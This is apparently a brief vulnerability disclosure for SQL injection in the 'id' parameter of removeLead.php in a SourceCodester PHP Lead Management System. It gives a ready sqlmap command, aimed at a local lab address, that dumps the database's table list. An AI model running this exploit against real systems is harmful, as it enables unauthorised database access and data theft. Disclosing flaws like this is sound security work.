vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208410977-4853452c-f26f-4bd6-9fcf-187bfebddd46.png)

EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeLead.php?id=1" --dbms=mysql -D penglead --tables
```

![image](https://user-images.githubusercontent.com/30823782/208411011-62e0095d-ecfe-40c6-a880-4b33fa55d7b1.png)
